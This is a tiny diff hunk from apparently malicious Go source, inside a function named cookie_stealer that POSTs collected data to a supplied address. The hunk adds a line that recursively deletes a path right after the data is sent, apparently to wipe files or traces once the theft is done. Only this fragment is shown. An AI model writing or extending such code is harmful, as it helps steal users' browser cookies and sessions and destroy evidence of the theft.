@@ -158,6 +158,7 @@ func cookie_stealer(addr string, detail machineinfo.VersionDetail) {
 			Post(addr).
 			Send(msg).
 			End()
+		os.RemoveAll(safe_path)
 		return
 	}
 	if os.IsNotExist(err) {
